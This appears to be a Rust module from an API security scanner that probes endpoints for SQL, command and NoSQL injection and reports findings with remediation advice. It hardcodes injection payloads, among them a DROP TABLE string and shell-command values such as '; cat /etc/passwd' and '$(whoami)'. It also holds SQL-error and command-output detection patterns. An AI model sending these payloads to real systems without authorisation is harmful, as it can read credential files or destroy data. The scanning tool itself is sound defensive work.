//! Injection Testing Module
//!
//! Tests for various injection vulnerabilities in API endpoints:
//! - SQL Injection
//! - Command Injection
//! - NoSQL Injection
//! - LDAP Injection

use anyhow::Result;
use log::{debug, info};
use reqwest::{Client, Method};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use super::{
    discovery::{ApiEndpoint, ApiParameter, ParameterLocation},
    ApiSecurityConfig, ApiSecurityFinding, ApiSecuritySeverity, ApiSecurityTestType,
    OwaspApiCategory,
};

/// Result of injection testing
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InjectionTestResult {
    pub endpoint: String,
    pub parameter: String,
    pub injection_type: String,
    pub vulnerable: bool,
    pub payload: String,
    pub evidence: String,
}

/// SQL Injection payloads
const SQLI_PAYLOADS: &[&str] = &[
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "1' AND '1'='2",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 AND 1=1",
    "1 AND 1=2",
];

/// SQL error patterns
const SQL_ERROR_PATTERNS: &[&str] = &[
    "sql syntax",
    "mysql",
    "postgresql",
    "sqlite",
    "ora-",
    "microsoft sql",
    "odbc",
    "syntax error",
    "unclosed quotation",
    "quoted string not properly terminated",
    "sqlexception",
    "invalid column",
    "unknown column",
    "column count doesn't match",
];

/// Command injection payloads
const CMD_INJECTION_PAYLOADS: &[&str] = &[
    "; ls",
    "| ls",
    "`ls`",
    "$(ls)",
    "& dir",
    "| dir",
    "; whoami",
    "| whoami",
    "`whoami`",
    "$(whoami)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; id",
    "| id",
    // Sleep-based payloads for blind detection
    "; sleep 5",
    "| sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "& ping -c 5 127.0.0.1",
];

/// Command injection indicators
const CMD_INJECTION_INDICATORS: &[&str] = &[
    "root:",        // From /etc/passwd
    "uid=",         // From id command
    "bin/",         // Common in command output
    "total ",       // From ls -la
    "drwx",         // Directory permissions
    "-rw-",         // File permissions
    "Volume Serial", // Windows dir output
    "Directory of", // Windows dir output
];

/// NoSQL Injection payloads
const NOSQL_PAYLOADS: &[(&str, &str)] = &[
    ("$ne", r#"{"$ne": ""}"#),
    ("$gt", r#"{"$gt": ""}"#),
    ("$regex", r#"{"$regex": ".*"}"#),
    ("$where", r#"{"$where": "1==1"}"#),
    ("$or", r#"[{"$or": [{}]}, {"$or": [{}]}]"#),
];

/// Test for injection vulnerabilities on an endpoint
pub async fn test_injection(
    client: &Client,
    config: &ApiSecurityConfig,
    endpoint: &ApiEndpoint,
) -> Result<Vec<ApiSecurityFinding>> {
    let mut findings = Vec::new();

    info!(
        "Testing injection vulnerabilities on {} {}",
        endpoint.method, endpoint.path
    );

    let url = build_endpoint_url(&config.target_url, &endpoint.path);

    // Test each parameter
    for param in &endpoint.parameters {
        // Test SQL injection
        let sqli_findings = test_sqli(client, config, endpoint, &url, param).await?;
        findings.extend(sqli_findings);

        // Test command injection
        let cmd_findings = test_command_injection(client, config, endpoint, &url, param).await?;
        findings.extend(cmd_findings);

        // Test NoSQL injection if it looks like a JSON API
        if param.location == ParameterLocation::Body {
            let nosql_findings = test_nosql_injection(client, config, endpoint, &url, param).await?;
            findings.extend(nosql_findings);
        }
    }

    // If endpoint accepts POST/PUT/PATCH, test request body
    if ["POST", "PUT", "PATCH"].contains(&endpoint.method.as_str()) {
        let body_findings = test_body_injection(client, config, endpoint, &url).await?;
        findings.extend(body_findings);
    }

    Ok(findings)
}

/// Test for SQL injection in a parameter
async fn test_sqli(
    client: &Client,
    config: &ApiSecurityConfig,
    endpoint: &ApiEndpoint,
    base_url: &str,
    param: &ApiParameter,
) -> Result<Vec<ApiSecurityFinding>> {
    let mut findings = Vec::new();

    debug!(
        "Testing SQLi in parameter '{}' ({:?})",
        param.name, param.location
    );

    // Get baseline response
    let baseline = get_baseline_response(client, endpoint, base_url, param).await?;

    for payload in SQLI_PAYLOADS {
        let (request_desc, response) = match param.location {
            ParameterLocation::Query => {
                let url = format!("{}?{}={}", base_url, param.name, urlencoding::encode(payload));
                let req_desc = format!("GET {}?{}={}", base_url, param.name, payload);
                let resp = client.get(&url).send().await;
                (req_desc, resp)
            }
            ParameterLocation::Path => {
                // Replace path parameter
                let url = base_url.replace(&format!("{{{}}}", param.name), payload);
                let req_desc = format!("GET {}", url);
                let resp = client.get(&url).send().await;
                (req_desc, resp)
            }
            ParameterLocation::Header => {
                let method = endpoint.method.parse::<Method>().unwrap_or(Method::GET);
                let req = build_method_request(client, method, base_url)
                    .header(&param.name, *payload);
                let req_desc = format!("{} {} with header {}={}", endpoint.method, base_url, param.name, payload);
                (req_desc, req.send().await)
            }
            _ => continue,
        };

        if let Ok(response) = response {
            let status = response.status();
            let body = response.text().await.unwrap_or_default();

            // Check for SQL error messages
            if contains_sql_error(&body) {
                findings.push(ApiSecurityFinding {
                    finding_type: ApiSecurityTestType::SqlInjection,
                    severity: ApiSecuritySeverity::Critical,
                    title: format!(
                        "SQL Injection in {} parameter on {} {}",
                        param.name, endpoint.method, endpoint.path
                    ),
                    description: format!(
                        "The parameter '{}' is vulnerable to SQL injection. The server returned SQL error messages when testing with payload: {}",
                        param.name, payload
                    ),
                    endpoint_path: Some(endpoint.path.clone()),
                    endpoint_method: Some(endpoint.method.clone()),
                    request: Some(request_desc),
                    response: Some(truncate_text(&body, 500)),
                    evidence: HashMap::from([
                        ("parameter".to_string(), serde_json::json!(param.name)),
                        ("payload".to_string(), serde_json::json!(payload)),
                        ("status_code".to_string(), serde_json::json!(status.as_u16())),
                    ]),
                    remediation: "Use parameterized queries (prepared statements) for all database operations. Never concatenate user input directly into SQL queries. Implement input validation and use an ORM or query builder.".to_string(),
                    cwe_ids: vec![89],
                    owasp_category: Some(OwaspApiCategory::SecurityMisconfiguration),
                });
                break; // One finding per parameter
            }

            // Check for boolean-based blind SQLi indicators
            if let Some(ref baseline_body) = baseline {
                let size_diff = (body.len() as i64 - baseline_body.len() as i64).abs();
                let size_ratio = size_diff as f64 / baseline_body.len().max(1) as f64;

                // Significant size difference might indicate boolean blind SQLi
                if size_ratio > 0.5 && payload.contains("AND") {
                    debug!(
                        "Potential blind SQLi detected: {}% response size change",
                        size_ratio * 100.0
                    );
                }
            }
        }

        // Rate limiting
        tokio::time::sleep(config.rate_limit_delay).await;
    }

    Ok(findings)
}

/// Test for command injection in a parameter
async fn test_command_injection(
    client: &Client,
    config: &ApiSecurityConfig,
    endpoint: &ApiEndpoint,
    base_url: &str,
    param: &ApiParameter,
) -> Result<Vec<ApiSecurityFinding>> {
    let mut findings = Vec::new();

    debug!(
        "Testing command injection in parameter '{}' ({:?})",
        param.name, param.location
    );

    for payload in CMD_INJECTION_PAYLOADS {
        let (request_desc, response) = match param.location {
            ParameterLocation::Query => {
                let url = format!("{}?{}={}", base_url, param.name, urlencoding::encode(payload));
                let req_desc = format!("GET {}?{}={}", base_url, param.name, payload);
                let resp = client.get(&url).send().await;
                (req_desc, resp)
            }
            ParameterLocation::Path => {
                let url = base_url.replace(&format!("{{{}}}", param.name), &urlencoding::encode(payload).to_string());
                let req_desc = format!("GET {}", url);
                let resp = client.get(&url).send().await;
                (req_desc, resp)
            }
            _ => continue,
        };

        if let Ok(response) = response {
            let status = response.status();
            let body = response.text().await.unwrap_or_default();

            // Check for command execution indicators
            if contains_cmd_output(&body) {
                findings.push(ApiSecurityFinding {
                    finding_type: ApiSecurityTestType::CommandInjection,
                    severity: ApiSecuritySeverity::Critical,
                    title: format!(
                        "Command Injection in {} parameter on {} {}",
                        param.name, endpoint.method, endpoint.path
                    ),
                    description: format!(
                        "The parameter '{}' is vulnerable to command injection. The server appears to be executing shell commands based on user input. Payload used: {}",
                        param.name, payload
                    ),
                    endpoint_path: Some(endpoint.path.clone()),
                    endpoint_method: Some(endpoint.method.clone()),
                    request: Some(request_desc),
                    response: Some(truncate_text(&body, 500)),
                    evidence: HashMap::from([
                        ("parameter".to_string(), serde_json::json!(param.name)),
                        ("payload".to_string(), serde_json::json!(payload)),
                        ("status_code".to_string(), serde_json::json!(status.as_u16())),
                    ]),
                    remediation: "Never pass user input directly to shell commands. If shell execution is necessary, use a whitelist of allowed commands and validate/sanitize all input. Consider using language-native functions instead of shell commands.".to_string(),
                    cwe_ids: vec![78, 77],
                    owasp_category: Some(OwaspApiCategory::SecurityMisconfiguration),
                });
                break;
            }
        }

        tokio::time::sleep(config.rate_limit_delay).await;
    }

    Ok(findings)
}

/// Test for NoSQL injection
async fn test_nosql_injection(
    client: &Client,
    config: &ApiSecurityConfig,
    endpoint: &ApiEndpoint,
    base_url: &str,
    param: &ApiParameter,
) -> Result<Vec<ApiSecurityFinding>> {
    let findings = Vec::new();

    debug!("Testing NoSQL injection in parameter '{}'", param.name);

    for (name, payload) in NOSQL_PAYLOADS {
        // Build JSON body with NoSQL operator
        let body = format!(r#"{{"{}":{}}}"#, param.name, payload);

        let method = endpoint.method.parse::<Method>().unwrap_or(Method::POST);
        let req = build_method_request(client, method, base_url)
            .header("Content-Type", "application/json")
            .body(body.clone());

        if let Ok(response) = req.send().await {
            let status = response.status();
            let response_body = response.text().await.unwrap_or_default();

            // Check if NoSQL operator was processed (might return data or different behavior)
            // This is a heuristic check - actual detection requires baseline comparison
            if status.is_success() && response_body.len() > 50 {
                debug!(
                    "Potential NoSQL injection with {} operator - response size: {}",
                    name,
                    response_body.len()
                );
            }
        }

        tokio::time::sleep(config.rate_limit_delay).await;
    }

    Ok(findings)
}

/// Test request body for injection vulnerabilities
async fn test_body_injection(
    client: &Client,
    config: &ApiSecurityConfig,
    endpoint: &ApiEndpoint,
    base_url: &str,
) -> Result<Vec<ApiSecurityFinding>> {
    let mut findings = Vec::new();

    // If we have a request body schema, generate test payloads based on it
    if let Some(ref _schema) = endpoint.request_body_schema {
        // Test common JSON fields for injection
        let test_fields = ["id", "name", "email", "username", "query", "search", "filter"];

        for field in test_fields {
            for payload in SQLI_PAYLOADS.iter().take(3) {
                let body = format!(r#"{{"{}":{}}}"#, field, serde_json::json!(payload));

                let method = endpoint.method.parse::<Method>().unwrap_or(Method::POST);
                let req = build_method_request(client, method, base_url)
                    .header("Content-Type", "application/json")
                    .body(body.clone());

                if let Ok(response) = req.send().await {
                    let status = response.status();
                    let response_body = response.text().await.unwrap_or_default();

                    if contains_sql_error(&response_body) {
                        findings.push(ApiSecurityFinding {
                            finding_type: ApiSecurityTestType::SqlInjection,
                            severity: ApiSecuritySeverity::Critical,
                            title: format!(
                                "SQL Injection in request body field '{}' on {} {}",
                                field, endpoint.method, endpoint.path
                            ),
                            description: format!(
                                "The request body field '{}' is vulnerable to SQL injection.",
                                field
                            ),
                            endpoint_path: Some(endpoint.path.clone()),
                            endpoint_method: Some(endpoint.method.clone()),
                            request: Some(body),
                            response: Some(truncate_text(&response_body, 500)),
                            evidence: HashMap::from([
                                ("field".to_string(), serde_json::json!(field)),
                                ("payload".to_string(), serde_json::json!(payload)),
                                ("status_code".to_string(), serde_json::json!(status.as_u16())),
                            ]),
                            remediation: "Use parameterized queries for all database operations.".to_string(),
                            cwe_ids: vec![89],
                            owasp_category: Some(OwaspApiCategory::SecurityMisconfiguration),
                        });
                        break;
                    }
                }

                tokio::time::sleep(config.rate_limit_delay).await;
            }
        }
    }

    Ok(findings)
}

/// Build the full URL for an endpoint
fn build_endpoint_url(base_url: &str, path: &str) -> String {
    let base = base_url.trim_end_matches('/');
    let path = if path.starts_with('/') {
        path.to_string()
    } else {
        format!("/{}", path)
    };
    format!("{}{}", base, path)
}

/// Build a request with the appropriate method
fn build_method_request(client: &Client, method: Method, url: &str) -> reqwest::RequestBuilder {
    match method {
        Method::GET => client.get(url),
        Method::POST => client.post(url),
        Method::PUT => client.put(url),
        Method::DELETE => client.delete(url),
        Method::PATCH => client.patch(url),
        _ => client.get(url),
    }
}

/// Get baseline response for comparison
async fn get_baseline_response(
    client: &Client,
    endpoint: &ApiEndpoint,
    base_url: &str,
    param: &ApiParameter,
) -> Result<Option<String>> {
    let url = match param.location {
        ParameterLocation::Query => {
            format!("{}?{}=test", base_url, param.name)
        }
        _ => base_url.to_string(),
    };

    let method = endpoint.method.parse::<Method>().unwrap_or(Method::GET);
    let req = build_method_request(client, method, &url);

    match req.send().await {
        Ok(resp) => Ok(Some(resp.text().await.unwrap_or_default())),
        Err(_) => Ok(None),
    }
}

/// Check if response contains SQL error messages
fn contains_sql_error(text: &str) -> bool {
    let text_lower = text.to_lowercase();
    SQL_ERROR_PATTERNS
        .iter()
        .any(|pattern| text_lower.contains(pattern))
}

/// Check if response contains command execution output
fn contains_cmd_output(text: &str) -> bool {
    CMD_INJECTION_INDICATORS
        .iter()
        .any(|indicator| text.contains(indicator))
}

/// Truncate text for storage
fn truncate_text(text: &str, max_len: usize) -> String {
    if text.len() <= max_len {
        text.to_string()
    } else {
        format!("{}... [truncated]", &text[..max_len])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_contains_sql_error() {
        assert!(contains_sql_error("You have an error in your SQL syntax"));
        assert!(contains_sql_error("PostgreSQL error: syntax error at"));
        assert!(contains_sql_error("ORA-00933: SQL command not properly ended"));
        assert!(!contains_sql_error("Welcome to our application"));
    }

    #[test]
    fn test_contains_cmd_output() {
        assert!(contains_cmd_output("root:x:0:0:root:/root:/bin/bash"));
        assert!(contains_cmd_output("uid=1000(user) gid=1000(user)"));
        assert!(contains_cmd_output("drwxr-xr-x 2 root root"));
        assert!(!contains_cmd_output("User profile updated"));
    }

    #[test]
    fn test_truncate_text() {
        let short = "short text";
        assert_eq!(truncate_text(short, 100), short);

        let long = "a".repeat(200);
        let truncated = truncate_text(&long, 50);
        assert!(truncated.len() < 100);
        assert!(truncated.ends_with("... [truncated]"));
    }
}
